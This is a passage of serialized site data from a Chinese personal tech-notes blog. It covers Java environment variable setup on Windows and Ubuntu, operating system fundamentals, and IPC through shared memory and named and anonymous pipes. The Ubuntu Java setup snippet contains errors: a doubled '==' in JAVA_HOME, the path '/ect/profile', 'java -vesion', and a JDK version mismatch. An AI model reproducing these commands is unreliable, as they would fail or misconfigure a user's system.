菜鸟教程：java环境变量配置",normalizedContent:"这个是因为windows安装jdk的时候环境变量默认配到了jre上面了 重新配置下环境变量就可以解决问题 输入 mvn -v 则可以看到maven调用的java环境的位置 可以发现默认是jre，所以需要重新配置环境变量 菜鸟教程：java环境变量配置",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"Ubuntu 查看 java 安装路径",frontmatter:{title:"Ubuntu 查看 java 安装路径",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/8aef30/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/10.%20%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98/03.Ubuntu%20%E6%9F%A5%E7%9C%8B%20java%20%E5%AE%89%E8%A3%85%E8%B7%AF%E5%BE%84.html",relativePath:"04.java/10. 解决问题/03.Ubuntu 查看 java 安装路径.md",key:"v-ae2c6a66",path:"/pages/8aef30/",headersStr:null,content:"# 1. 安装 java\n\nsudo apt install openjdk-8-jdk\n\n\n1\n\n\n查看 java 版本信息\n\njava -version\n\n\n1\n\n\n\n\n-- java 安装成功。\n\n\n# 2. 查看路径\n\nwhich java\n\n\n1\n\n\n\n\nls -l /usr/bin/java 看看这是否是个软连接，找出这个软连接指向的路径\n\nls -l /usr/bin/java\n\n\n1\n\n\n\n\n的确为软连接，继续往下找指向的路径\n\n\n\n至此，java 的安装路径即为 /usr/lib/jvm/java-11-openjdk-amd64/bin/java\n\n\n# 3、配置 java 环境\n\nvim /etc/profile\n\n\n1\n\n\n在弹出的 vim 编辑器中输入\n\n# JAVA`\nJAVA_HOME==/usr/lib/jvm/java-11-openjdk-amd64`\nPATH=$JAVA_HOME/bin:$PATH`\nexport JAVA_HOME PATH`\n\n\n1\n2\n3\n4\n\n\nesc 退出编辑模式，输入 :x后，单击回车退出。\n\n在终端输入\n\nsource /ect/profile\n\n\n1\n\n\n使之前的配置生效。\n\n4、 验证\n\njava -vesion\n\n\n1\n\n\n\n\n$JAVA_HOME/bin/java -version\n\n\n1\n\n\n",normalizedContent:"# 1. 安装 java\n\nsudo apt install openjdk-8-jdk\n\n\n1\n\n\n查看 java 版本信息\n\njava -version\n\n\n1\n\n\n\n\n-- java 安装成功。\n\n\n# 2. 查看路径\n\nwhich java\n\n\n1\n\n\n\n\nls -l /usr/bin/java 看看这是否是个软连接，找出这个软连接指向的路径\n\nls -l /usr/bin/java\n\n\n1\n\n\n\n\n的确为软连接，继续往下找指向的路径\n\n\n\n至此，java 的安装路径即为 /usr/lib/jvm/java-11-openjdk-amd64/bin/java\n\n\n# 3、配置 java 环境\n\nvim /etc/profile\n\n\n1\n\n\n在弹出的 vim 编辑器中输入\n\n# java`\njava_home==/usr/lib/jvm/java-11-openjdk-amd64`\npath=$java_home/bin:$path`\nexport java_home path`\n\n\n1\n2\n3\n4\n\n\nesc 退出编辑模式，输入 :x后，单击回车退出。\n\n在终端输入\n\nsource /ect/profile\n\n\n1\n\n\n使之前的配置生效。\n\n4、 验证\n\njava -vesion\n\n\n1\n\n\n\n\n$java_home/bin/java -version\n\n\n1\n\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"目录",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"04.java",imgUrl:"/img/catalog.png",description:"java知识"}},title:"目录",date:"2022-04-17T21:48:12.000Z",permalink:"/java/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/catalog.html",relativePath:"04.java/catalog.md",key:"v-76e3cda5",path:"/java/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"基本概念",frontmatter:{title:"基本概念",date:"2022-04-17T23:56:30.000Z",permalink:"/pages/d3f00b/",categories:["操作系统"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/05.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/01.%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html",relativePath:"05.操作系统/01.基本概念.md",key:"v-6feab58a",path:"/pages/d3f00b/",headers:[{level:2,title:"组成",slug:"组成",normalizedTitle:"组成",charIndex:14},{level:3,title:"中央处理器",slug:"中央处理器",normalizedTitle:"中央处理器",charIndex:23},{level:4,title:"处理器与寄存器",slug:"处理器与寄存器",normalizedTitle:"处理器与寄存器",charIndex:225},{level:3,title:"主存储器",slug:"主存储器",normalizedTitle:"主存储器",charIndex:239},{level:3,title:"外围设备",slug:"外围设备",normalizedTitle:"外围设备",charIndex:256},{level:4,title:"设备类型",slug:"设备类型",normalizedTitle:"设备类型",charIndex:264},{level:4,title:"设备控制方式",slug:"设备控制方式",normalizedTitle:"设备控制方式",charIndex:424},{level:3,title:"总线",slug:"总线",normalizedTitle:"总线",charIndex:175},{level:4,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:515},{level:4,title:"总线的类型",slug:"总线的类型",normalizedTitle:"总线的类型",charIndex:670},{level:2,title:"冯诺依曼结构",slug:"冯诺依曼结构",normalizedTitle:"冯诺依曼结构",charIndex:776},{level:2,title:"存储器的组织层次",slug:"存储器的组织层次",normalizedTitle:"存储器的组织层次",charIndex:947},{level:2,title:"软件开发的不同层次",slug:"软件开发的不同层次",normalizedTitle:"软件开发的不同层次",charIndex:1015},{level:2,title:"计算机程序的执行过程",slug:"计算机程序的执行过程",normalizedTitle:"计算机程序的执行过程",charIndex:1171},{level:2,title:"操作系统的组成",slug:"操作系统的组成",normalizedTitle:"操作系统的组成",charIndex:1500},{level:2,title:"类型",slug:"类型",normalizedTitle:"类型",charIndex:266},{level:2,title:"资源管理",slug:"资源管理",normalizedTitle:"资源管理",charIndex:1051},{level:3,title:"屏蔽资源使用的底层细节",slug:"屏蔽资源使用的底层细节",normalizedTitle:"屏蔽资源使用的底层细节",charIndex:1794},{level:3,title:"资源共享方式",slug:"资源共享方式",normalizedTitle:"资源共享方式",charIndex:1940},{level:3,title:"资源分配策略",slug:"资源分配策略",normalizedTitle:"资源分配策略",charIndex:1972},{level:2,title:"系统控制",slug:"系统控制",normalizedTitle:"系统控制",charIndex:2016},{level:3,title:"多道程序系统的实现",slug:"多道程序系统的实现",normalizedTitle:"多道程序系统的实现",charIndex:2109},{level:3,title:"控制方式",slug:"控制方式",normalizedTitle:"控制方式",charIndex:426},{level:4,title:"脱机作业控制方式",slug:"脱机作业控制方式",normalizedTitle:"脱机作业控制方式",charIndex:2405},{level:4,title:"联机作业控制方式",slug:"联机作业控制方式",normalizedTitle:"联机作业控制方式",charIndex:2565},{level:3,title:"命令解释程序",slug:"命令解释程序",normalizedTitle:"命令解释程序",charIndex:2622},{level:4,title:"处理过程",slug:"处理过程",normalizedTitle:"处理过程",charIndex:2839},{level:2,title:"系统接口",slug:"系统接口",normalizedTitle:"系统接口",charIndex:3112},{level:3,title:"实现",slug:"实现",normalizedTitle:"实现",charIndex:154},{level:2,title:"系统结构",slug:"系统结构",normalizedTitle:"系统结构",charIndex:1448},{level:3,title:"结构设计",slug:"结构设计",normalizedTitle:"结构设计",charIndex:3465},{level:3,title:"内核",slug:"内核",normalizedTitle:"内核",charIndex:3476}],headersStr:"组成 中央处理器 处理器与寄存器 主存储器 外围设备 设备类型 设备控制方式 总线 简介 总线的类型 冯诺依曼结构 存储器的组织层次 软件开发的不同层次 计算机程序的执行过程 操作系统的组成 类型 资源管理 屏蔽资源使用的底层细节 资源共享方式 资源分配策略 系统控制 多道程序系统的实现 控制方式 脱机作业控制方式 联机作业控制方式 命令解释程序 处理过程 系统接口 实现 系统结构 结构设计 内核",content:"# 计算机硬件系统\n\n\n# 组成\n\n\n\n\n# 中央处理器\n\n中央处理器是计算机的运算核心（Core）和控制单元（ Control Unit） ，主要包括：\n\n * 运算逻辑部件： 一个或多个运算器\n * 寄存器部件： 包括通用寄存器、 控制与状态寄存器， 以及高速缓冲存储器（Cache）\n * 控制部件： 实现各部件间联系的数据、 控制及状态的内部总线； 负责对指令译码、发出为完成每条指令所要执行操作的控制信号、 实现数据传输等功能的部件\n\n# 处理器与寄存器\n\n\n\n\n# 主存储器\n\n> DRAM\n\n\n# 外围设备\n\n# 设备类型\n\n * 输入设备\n   \n   > 键盘 鼠标\n\n * 输出设备\n   \n   > 显示器\n\n * 存储设备\n   \n   >  1. 硬盘 如固态硬盘 机械硬盘 U盘等\n   > \n   >  2. 光驱\n   >     \n   >     ····\n\n * 网络通信设备\n   \n   > 网卡等\n\n# 设备控制方式\n\n * 轮询方式： CPU忙式控制+数据交换\n * 中断方式： CPU启动/中断+数据交换\n * DMA方式： CPU启动/中断， DMA数据交换\n\n\n# 总线\n\n# 简介\n\n总线（Bus） 是计算机各种功能部件之间传送信息的公共通信干线， 它是CPU、 内存、输入输出设备传递信息的公用通道\n\n计算机的各个部件通过总线相连接， 外围设备通过相应的接口电路再与总线相连接， 从而形成了计算机硬件系统\n\n按照所传输的信息种类， 总线包括一组控制线、 一组数据线和一组地址线\n\n# 总线的类型\n\n内部总线： 用于CPU芯片内部连接各元件\n\n系统总线： 用于连接CPU、 存储器和各种I/O模块等主要部件\n\n> 系统总线也有分级，如下面的图所示\n\n通信总线： 用于计算机系统之间通信\n\n\n\n\n# 冯诺依曼结构\n\n存储程序计算机\n\n冯·诺伊曼等人在1946年总结并明确提出，被称为冯·诺伊曼计算机模型存储程序计算机在体系结构上主要特点\n\n * 以运算单元为中心， 控制流由指令流产生\n * 采用存储程序原理， 面向主存组织数据流\n * 主存是按地址访问、 线性编址的空间\n * 指令由操作码和地址码组成\n * 数据以二进制编码\n\n\n\n\n# 存储器的组织层次\n\n存储器包括CPU中的高速缓存、主存储器、外围设备中的硬盘和网络中的远程存储器等\n\n\n\n\n# 计算机软件系统\n\n\n# 软件开发的不同层次\n\n * 计算机硬件系统： 机器语言\n * 操作系统之资源管理： 机器语言+广义指令（扩充了硬件资源管理）\n * 操作系统之文件系统： 机器语言+系统调用（扩充了信息资源管理）\n * 数据库管理系统： +数据库语言（扩充了功能更强的信息资源管理）\n * 语言处理程序： 面向问题的语言\n\n\n# 计算机程序的执行过程\n\n\n\n\n# 操作系统\n\n操作系统(Operating System)， 简称OS\n\nOS是计算机系统最基础的系统软件， 管理软硬件资源、 控制程序执行， 改善人机界面， 合理组织计算机工作流程， 为用户使用计算机提供良好运行环境\n\n简而言之， 操作系统是方便用户、 管理和控制计算机软硬件资源的系统程序集合\n\n * 从用户角度看， OS管理计算机系统的各种资源， 扩充硬件的功能， 控制程序的执行\n * 从人机交互看， OS是用户与机器的接口，提供良好的人机界面， 方便用户使用计算机，在整个计算机系统中具有承上启下的地位\n * 从系统结构看， OS是一个大型软件系统，其功能复杂， 体系庞大， 采用层次式、 模块化的程序结构\n\n\n# 操作系统的组成\n\n * 进程调度子系统\n * 进程通信子系统\n * 内存管理子系统\n * 设备管理子系统\n * 文件管理子系统\n * 网络通信子系统\n * 作业控制子系统\n\n\n# 类型\n\n操作控制方式\n\n * 多道批处理操作系统， 脱机控制方式\n * 分时操作系统， 交互式控制方式\n * 实时操作系统\n\n应用领域\n\n * 服务器操作系统、 并行操作系统\n * 网络操作系统、 分布式操作系统\n * 个人机操作系统、 手机操作系统\n * 嵌入式操作系统、 传感器操作系统\n\n\n# 资源管理\n\n计算机资源包含\n\n * 硬件资源 处理器、 内存、 外设\n * 信息资源 数据、 程序\n\n\n# 屏蔽资源使用的底层细节\n\n驱动程序： 最底层的、 直接控制和监视各类硬件(或文件)资源的部分\n\n> 职责是隐藏底层硬件的具体细节， 并向其他部分提供一个抽象的、 通用的接口 比如说： 打印一段文字或一个文件， 既不需知道文件信息存储在硬盘上的细节，也不必知道具体打印机类型和控制细节\n\n\n# 资源共享方式\n\n * 独占使用方式\n * 并发使用方式\n\n\n# 资源分配策略\n\n * 静态分配方式\n * 动态分配方式\n * 资源抢占方式 、\n\n\n# 系统控制\n\nCPU速度与I/O速度不匹配的矛盾非常突出.只有让多道程序同时进入内存争抢CPU运行， 才可以够使得CPU和外围设备充分并行， 从而提高计算机系统的使用效率\n\n\n\n\n\n\n# 多道程序系统的实现\n\n * 为进入内存执行的程序建立管理实体： 进程\n\n * OS应能管理与控制进程程序的执行\n\n * OS协调管理各类资源在进程间的使用\n   \n   * 处理器的管理和调度\n   * 主存储器的管理和调度\n   * 其他资源的管理和调度\n\n * 如何使用资源： 调用操作系统提供的服务例程(如何陷入操作系统)\n\n * 如何复用CPU： 调度程序(在CPU空闲时让其他程序运行)\n\n * 如何使CPU与I/O设备充分并行： 设备控制器与通道(专用的I/O处理器)\n\n * 如何让正在运行的程序让出CPU： 中断(中断正在执行的程序， 引入OS处理)\n\n\n# 控制方式\n\n# 脱机作业控制方式\n\n 1. OS： 提供作业说明语言\n\n 2. 用户： 编写作业说明书， 确定作业加工控制步骤，并与程序数据一并提交\n\n 3. 操作员： 通过控制台输入作业\n\n 4. OS： 通过作业控制程序自动控制作业的执行\n\n> 例： 批处理OS的作业控制方式， UNIX的shell程序，DOS的bat文件\n\n# 联机作业控制方式\n\n 1. 计算机： 提供终端（键盘/显示器）\n\n 2. 用户： 登录系统\n\n 3. OS： 提供命令解释程序\n\n 4. 用户： 联机输入命令， 直接控制作业步的执行\n\n> 例： 分时OS的交互控制方式\n\n\n# 命令解释程序\n\n不管是脱机控制方式还是联机控制方式都需要命令解释程序\n\n命令解释程序： 接受和执行一条用户提出的对作业的加工处理命令 当一个新的批作业被启动， 或新的交互型用户登录进系统时， 系统就自动地执行命令解释程序， 负责读入控制卡或命令行， 作出相应解释， 并予以执行\n\n会话语言： 可编程的命令解释程序\n\n# 处理过程\n\n 1. OS启动命令解释程序， 输出命令提示符， 等待（键盘中断/鼠标点击/多通道识别）\n 2. 每当用户输入一条命令(暂存在命令缓冲区)并按回车换行时， 申请中断\n 3. CPU响应后， 将控制权交给命令解释程序，接着读入命令缓冲区内容， 分析命令、 接受参数， 执行处理代码\n 4. 前台命令执行结束后， 再次输出命令提示符，等待下一条命令\n 5. 后台命令处理启动后， 即可接收下条命令\n\n> 前台命令：必须执行完毕后，才能继续输入命令\n> \n> 后台命令：命令启动后，可以继续启动下一个命令，而命令在后台的执行不影响\n\n\n# 系统接口\n\n操作系统的程序接口——系统调用\n\n操作系统实现的完成某种特定功能的过程； 为所有运行程序提供访问操作系统的接口\n\n> 就是操作系统为一些操作提供了接口，应用程序需要执行这些操作的时候就会去调用这些接口\n\n\n# 实现\n\n * 编写系统调用处理程序\n   \n   > 操作系统会提前提供这些系统调用处理程序\n\n * 设计一张系统调用入口地址表， 每个入口地址指向一个系统调用的处理程序， 并包含系统调用自带参数的个数\n   \n   > 通过软件发起，系统查阅系统调用入口地址表，找到相应的系统调用处理程序\n\n * 陷入处理机制需开辟现场保护区， 以保存发生系统调用时的处理器现场\n   \n   > 在调用系统调用之前，将当前的处理器状况存储，以便调用后恢复处理器现场\n\n\n\n\n# 系统结构\n\n\n# 结构设计\n\nOS构件 内核、 进程、 线程、 管程等\n\n> 内核设计是OS设计中最为复杂的部分\n\n设计概念 模块化、 层次式、 虚拟化\n\n\n# 内核\n\n单内核：内核中各部件杂然混居的形态， 始于1960年代， 广泛使用； 如Unix/Linux， 及Windows(自称采用混合内核的CS结构)\n\n微内核：1980年代始， 强调结构性部件与功能性部件的分离， 大部分OS研究都集中在此\n\n混合内核：微内核和单内核的折中， 较多组件在核心态中运行， 以获得更快的执行速度\n\n外内核：尽可能减少内核的软件抽象化和传统微内核的消息传递机制，使得开发者专注于硬件的抽象化，部分嵌入式系统使用\n\n",normalizedContent:"# 计算机硬件系统\n\n\n# 组成\n\n\n\n\n# 中央处理器\n\n中央处理器是计算机的运算核心（core）和控制单元（ control unit） ，主要包括：\n\n * 运算逻辑部件： 一个或多个运算器\n * 寄存器部件： 包括通用寄存器、 控制与状态寄存器， 以及高速缓冲存储器（cache）\n * 控制部件： 实现各部件间联系的数据、 控制及状态的内部总线； 负责对指令译码、发出为完成每条指令所要执行操作的控制信号、 实现数据传输等功能的部件\n\n# 处理器与寄存器\n\n\n\n\n# 主存储器\n\n> dram\n\n\n# 外围设备\n\n# 设备类型\n\n * 输入设备\n   \n   > 键盘 鼠标\n\n * 输出设备\n   \n   > 显示器\n\n * 存储设备\n   \n   >  1. 硬盘 如固态硬盘 机械硬盘 u盘等\n   > \n   >  2. 光驱\n   >     \n   >     ····\n\n * 网络通信设备\n   \n   > 网卡等\n\n# 设备控制方式\n\n * 轮询方式： cpu忙式控制+数据交换\n * 中断方式： cpu启动/中断+数据交换\n * dma方式： cpu启动/中断， dma数据交换\n\n\n# 总线\n\n# 简介\n\n总线（bus） 是计算机各种功能部件之间传送信息的公共通信干线， 它是cpu、 内存、输入输出设备传递信息的公用通道\n\n计算机的各个部件通过总线相连接， 外围设备通过相应的接口电路再与总线相连接， 从而形成了计算机硬件系统\n\n按照所传输的信息种类， 总线包括一组控制线、 一组数据线和一组地址线\n\n# 总线的类型\n\n内部总线： 用于cpu芯片内部连接各元件\n\n系统总线： 用于连接cpu、 存储器和各种i/o模块等主要部件\n\n> 系统总线也有分级，如下面的图所示\n\n通信总线： 用于计算机系统之间通信\n\n\n\n\n# 冯诺依曼结构\n\n存储程序计算机\n\n冯·诺伊曼等人在1946年总结并明确提出，被称为冯·诺伊曼计算机模型存储程序计算机在体系结构上主要特点\n\n * 以运算单元为中心， 控制流由指令流产生\n * 采用存储程序原理， 面向主存组织数据流\n * 主存是按地址访问、 线性编址的空间\n * 指令由操作码和地址码组成\n * 数据以二进制编码\n\n\n\n\n# 存储器的组织层次\n\n存储器包括cpu中的高速缓存、主存储器、外围设备中的硬盘和网络中的远程存储器等\n\n\n\n\n# 计算机软件系统\n\n\n# 软件开发的不同层次\n\n * 计算机硬件系统： 机器语言\n * 操作系统之资源管理： 机器语言+广义指令（扩充了硬件资源管理）\n * 操作系统之文件系统： 机器语言+系统调用（扩充了信息资源管理）\n * 数据库管理系统： +数据库语言（扩充了功能更强的信息资源管理）\n * 语言处理程序： 面向问题的语言\n\n\n# 计算机程序的执行过程\n\n\n\n\n# 操作系统\n\n操作系统(operating system)， 简称os\n\nos是计算机系统最基础的系统软件， 管理软硬件资源、 控制程序执行， 改善人机界面， 合理组织计算机工作流程， 为用户使用计算机提供良好运行环境\n\n简而言之， 操作系统是方便用户、 管理和控制计算机软硬件资源的系统程序集合\n\n * 从用户角度看， os管理计算机系统的各种资源， 扩充硬件的功能， 控制程序的执行\n * 从人机交互看， os是用户与机器的接口，提供良好的人机界面， 方便用户使用计算机，在整个计算机系统中具有承上启下的地位\n * 从系统结构看， os是一个大型软件系统，其功能复杂， 体系庞大， 采用层次式、 模块化的程序结构\n\n\n# 操作系统的组成\n\n * 进程调度子系统\n * 进程通信子系统\n * 内存管理子系统\n * 设备管理子系统\n * 文件管理子系统\n * 网络通信子系统\n * 作业控制子系统\n\n\n# 类型\n\n操作控制方式\n\n * 多道批处理操作系统， 脱机控制方式\n * 分时操作系统， 交互式控制方式\n * 实时操作系统\n\n应用领域\n\n * 服务器操作系统、 并行操作系统\n * 网络操作系统、 分布式操作系统\n * 个人机操作系统、 手机操作系统\n * 嵌入式操作系统、 传感器操作系统\n\n\n# 资源管理\n\n计算机资源包含\n\n * 硬件资源 处理器、 内存、 外设\n * 信息资源 数据、 程序\n\n\n# 屏蔽资源使用的底层细节\n\n驱动程序： 最底层的、 直接控制和监视各类硬件(或文件)资源的部分\n\n> 职责是隐藏底层硬件的具体细节， 并向其他部分提供一个抽象的、 通用的接口 比如说： 打印一段文字或一个文件， 既不需知道文件信息存储在硬盘上的细节，也不必知道具体打印机类型和控制细节\n\n\n# 资源共享方式\n\n * 独占使用方式\n * 并发使用方式\n\n\n# 资源分配策略\n\n * 静态分配方式\n * 动态分配方式\n * 资源抢占方式 、\n\n\n# 系统控制\n\ncpu速度与i/o速度不匹配的矛盾非常突出.只有让多道程序同时进入内存争抢cpu运行， 才可以够使得cpu和外围设备充分并行， 从而提高计算机系统的使用效率\n\n\n\n\n\n\n# 多道程序系统的实现\n\n * 为进入内存执行的程序建立管理实体： 进程\n\n * os应能管理与控制进程程序的执行\n\n * os协调管理各类资源在进程间的使用\n   \n   * 处理器的管理和调度\n   * 主存储器的管理和调度\n   * 其他资源的管理和调度\n\n * 如何使用资源： 调用操作系统提供的服务例程(如何陷入操作系统)\n\n * 如何复用cpu： 调度程序(在cpu空闲时让其他程序运行)\n\n * 如何使cpu与i/o设备充分并行： 设备控制器与通道(专用的i/o处理器)\n\n * 如何让正在运行的程序让出cpu： 中断(中断正在执行的程序， 引入os处理)\n\n\n# 控制方式\n\n# 脱机作业控制方式\n\n 1. os： 提供作业说明语言\n\n 2. 用户： 编写作业说明书， 确定作业加工控制步骤，并与程序数据一并提交\n\n 3. 操作员： 通过控制台输入作业\n\n 4. os： 通过作业控制程序自动控制作业的执行\n\n> 例： 批处理os的作业控制方式， unix的shell程序，dos的bat文件\n\n# 联机作业控制方式\n\n 1. 计算机： 提供终端（键盘/显示器）\n\n 2. 用户： 登录系统\n\n 3. os： 提供命令解释程序\n\n 4. 用户： 联机输入命令， 直接控制作业步的执行\n\n> 例： 分时os的交互控制方式\n\n\n# 命令解释程序\n\n不管是脱机控制方式还是联机控制方式都需要命令解释程序\n\n命令解释程序： 接受和执行一条用户提出的对作业的加工处理命令 当一个新的批作业被启动， 或新的交互型用户登录进系统时， 系统就自动地执行命令解释程序， 负责读入控制卡或命令行， 作出相应解释， 并予以执行\n\n会话语言： 可编程的命令解释程序\n\n# 处理过程\n\n 1. os启动命令解释程序， 输出命令提示符， 等待（键盘中断/鼠标点击/多通道识别）\n 2. 每当用户输入一条命令(暂存在命令缓冲区)并按回车换行时， 申请中断\n 3. cpu响应后， 将控制权交给命令解释程序，接着读入命令缓冲区内容， 分析命令、 接受参数， 执行处理代码\n 4. 前台命令执行结束后， 再次输出命令提示符，等待下一条命令\n 5. 后台命令处理启动后， 即可接收下条命令\n\n> 前台命令：必须执行完毕后，才能继续输入命令\n> \n> 后台命令：命令启动后，可以继续启动下一个命令，而命令在后台的执行不影响\n\n\n# 系统接口\n\n操作系统的程序接口——系统调用\n\n操作系统实现的完成某种特定功能的过程； 为所有运行程序提供访问操作系统的接口\n\n> 就是操作系统为一些操作提供了接口，应用程序需要执行这些操作的时候就会去调用这些接口\n\n\n# 实现\n\n * 编写系统调用处理程序\n   \n   > 操作系统会提前提供这些系统调用处理程序\n\n * 设计一张系统调用入口地址表， 每个入口地址指向一个系统调用的处理程序， 并包含系统调用自带参数的个数\n   \n   > 通过软件发起，系统查阅系统调用入口地址表，找到相应的系统调用处理程序\n\n * 陷入处理机制需开辟现场保护区， 以保存发生系统调用时的处理器现场\n   \n   > 在调用系统调用之前，将当前的处理器状况存储，以便调用后恢复处理器现场\n\n\n\n\n# 系统结构\n\n\n# 结构设计\n\nos构件 内核、 进程、 线程、 管程等\n\n> 内核设计是os设计中最为复杂的部分\n\n设计概念 模块化、 层次式、 虚拟化\n\n\n# 内核\n\n单内核：内核中各部件杂然混居的形态， 始于1960年代， 广泛使用； 如unix/linux， 及windows(自称采用混合内核的cs结构)\n\n微内核：1980年代始， 强调结构性部件与功能性部件的分离， 大部分os研究都集中在此\n\n混合内核：微内核和单内核的折中， 较多组件在核心态中运行， 以获得更快的执行速度\n\n外内核：尽可能减少内核的软件抽象化和传统微内核的消息传递机制，使得开发者专注于硬件的抽象化，部分嵌入式系统使用\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"进程通信：共享内存",frontmatter:{title:"进程通信：共享内存",date:"2022-04-17T23:56:30.000Z",permalink:"/pages/ce2351/",categories:["操作系统","进程和线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/05.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/01.%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/01.%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%EF%BC%9A%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98.html",relativePath:"05.操作系统/01.进程和线程/01.进程通信：共享内存.md",key:"v-0cd0b701",path:"/pages/ce2351/",headersStr:null,content:"消息队列的读取和写入的过程，都会有发生用户态与内核态之间的消息拷贝过程。那共享内存的方式，就很好的解决了这⼀问题。\n\n现代操作系统，对于内存管理，采⽤的是虚拟内存技术，也就是每个进程都有⾃⼰独⽴的虚拟内存空间，不同进程的虚拟内存映射到不同的物理内存中。所以，即使进程 A 和 进程 B 的虚拟地址是⼀样的，其实访问的是不同的物理内存地址，对于数据的增删查改互不影响。\n\n共享内存的机制，就是拿出⼀块虚拟地址空间来，映射到相同的物理内存中。这样这个进程写入的东西，另外⼀个进程马上就能看到了，都不需要拷贝来拷贝去，传来传去，大大提高了进程间通信的速度。",normalizedContent:"消息队列的读取和写入的过程，都会有发生用户态与内核态之间的消息拷贝过程。那共享内存的方式，就很好的解决了这⼀问题。\n\n现代操作系统，对于内存管理，采⽤的是虚拟内存技术，也就是每个进程都有⾃⼰独⽴的虚拟内存空间，不同进程的虚拟内存映射到不同的物理内存中。所以，即使进程 a 和 进程 b 的虚拟地址是⼀样的，其实访问的是不同的物理内存地址，对于数据的增删查改互不影响。\n\n共享内存的机制，就是拿出⼀块虚拟地址空间来，映射到相同的物理内存中。这样这个进程写入的东西，另外⼀个进程马上就能看到了，都不需要拷贝来拷贝去，传来传去，大大提高了进程间通信的速度。",charsets:{cjk:!0},lastUpdated:"2022/05/31, 15:02:31",lastUpdatedTimestamp:1653980551e3},{title:"进程通信：管道",frontmatter:{title:"进程通信：管道",date:"2022-04-17T23:56:30.000Z",permalink:"/pages/36d761/",categories:["操作系统","进程和线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/05.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/01.%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/02.%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%EF%BC%9A%E7%AE%A1%E9%81%93.html",relativePath:"05.操作系统/01.进程和线程/02.进程通信：管道.md",key:"v-f916120a",path:"/pages/36d761/",headers:[{level:2,title:"父子进程通信",slug:"父子进程通信",normalizedTitle:"父子进程通信",charIndex:848},{level:2,title:"shell进程通信",slug:"shell进程通信",normalizedTitle:"shell进程通信",charIndex:1399}],headersStr:"父子进程通信 shell进程通信",content:'# 匿名管道\n\n如果你学过 Linux 命令，那你肯定很熟悉「 | 」这个竖线。\n\n$ ps -ef | grep java\n\n\n1\n\n\n上⾯命令⾏⾥的「| 」竖线就是⼀个管道，它的功能是将前⼀个命令（ ps -ef ）的输出，作为后⼀个命令（ grep java ）的输⼊，从这功能描述，可以看出管道传输数据是单向的，如果想相互通信，我们需要创建两个管道。 同时，我们得知上⾯这种管道是没有名字，所以「 | 」表示的管道称为匿名管道，⽤完了就销毁。\n\n\n# 命名管道\n\n管道还有另外⼀个类型是命名管道，也被叫做 FIFO ，因为数据是先进先出的传输⽅式。 在使⽤命名管道前，先需要通过 mkfifo 命令来创建，并且指定管道名字：\n\n$ mkfifo myPipe\n\n\n1\n\n\nmyPipe 就是这个管道的名称，基于 Linux ⼀切皆⽂件的理念，所以管道也是以⽂件的⽅式存在，我们可以⽤ ls 看⼀下，这个⽂件的类型是 p，也就是 pipe（管道） 的意思：\n\n$ ls -l\nprw-r--r--. 1 root root 0 Jul 17 02:45 myPipe\n\n\n1\n2\n\n\n接下来，我们往 myPipe 这个管道写⼊数据：\n\n$ echo "hello" > myPipe // 将数据写进管道\n// 停住了 ...\n\n\n1\n2\n\n\n操作了后，你会发现命令执⾏后就停在这了，这是因为管道⾥的内容没有被读取，只有当管道⾥的数据被读完后，命令才可以正常退出。\n\n于是，我们执行另外⼀个命令来读取这个管道⾥的数据：\n\n$ cat < myPipe // 读取管道⾥的数据\nhello\n\n\n1\n2\n\n\n可以看到，管道⾥的内容被读取出来了，并打印在了终端上，另外⼀⽅⾯， echo 那个命令也正常退出了。\n\n我们可以看出， 管道这种通信方式效率低，不适合进程间频繁地交换数据。当然，它的好处，⾃然就是简单，同时也我们很容易得知管道⾥的数据已经被另⼀个进程读取了。\n\n\n# 背后原理\n\n\n# 父子进程通信\n\n匿名管道的创建，需要通过这个系统调⽤： int pipe(int fd[2]) 这⾥表示创建⼀个匿名管道，并返回了两个描述符，⼀个是管道的读取端描述符fd[0] ，另⼀个是管道的写入端描述符 fd[1] 。注意，这个匿名管道是特殊的⽂件，只存在于内存，不存于⽂件系统中。 其实， 所谓的管道，就是内核里面的一串缓存。从管道的⼀段写入的数据，实际上是缓存在内核中的，另⼀端读取，也就是从内核中读取这段数据。另外，管道传输的数据是⽆格式的流且大小受限。\n\n这两个描述符都是在⼀个进程⾥⾯，并没有起到进程间通信的作⽤，怎么样才能使得管道是跨过两个进程的呢？ 我们可以使用 fork 创建子进程， 创建的子进程会复制父进程的文件描述符，这样就做到了两个进程各有两个 fd[0] 与 fd[1]，两个进程就可以通过各自的 fd 写⼊和读取同一个管道文件实现跨进程通信了。 管道只能⼀端写⼊，另⼀端读出，所以上⾯这种模式容易造成混乱，因为⽗进程和⼦进程都可以同时写入，也都可以读出。那么，为了避免这种情况，通常的做法是：\n\n * ⽗进程关闭读取的 fd[0]，只保留写⼊的fd[1]\n * ⼦进程关闭写⼊的 fd[1]，只保留读取的fd[0] 所以说如果需要双向通信，则应该创建两个管道。\n\n\n# 